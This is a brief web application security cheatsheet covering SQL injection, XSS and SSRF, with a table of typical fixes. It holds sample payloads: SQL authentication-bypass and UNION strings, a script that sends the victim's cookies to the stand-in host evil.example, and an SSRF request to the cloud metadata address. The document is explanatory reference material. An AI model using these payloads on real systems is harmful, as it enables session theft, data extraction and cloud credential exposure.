# Web Application Security Cheatsheet

Covers a few common vulnerability classes at a glance — good for testing
how the renderer handles mixed code languages in one page.

## SQL injection

```sql
-- classic authentication bypass
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';

-- UNION-based extraction
' UNION SELECT username, password FROM users -- 
```

## Cross-site scripting (XSS)

```html
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
```

- **Reflected** — payload bounces off the server in a response
- **Stored** — payload persists in the database and fires for other users
- **DOM-based** — payload never touches the server, only client-side JS

## Server-side request forgery (SSRF)

```prompt
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: vulnerable-app.example
```

## Quick reference table

| Vulnerability | Typical fix                                  |
| ------------- | --------------------------------------------- |
| SQLi          | Parameterised queries / prepared statements   |
| XSS           | Output encoding, CSP, `httpOnly` cookies      |
| SSRF          | Allowlist outbound destinations, block metadata IPs |
| IDOR          | Object-level authorisation checks on every request |

## Notes

> Demo content only — no live payloads here, just the shapes of the
> vulnerability classes for reference.
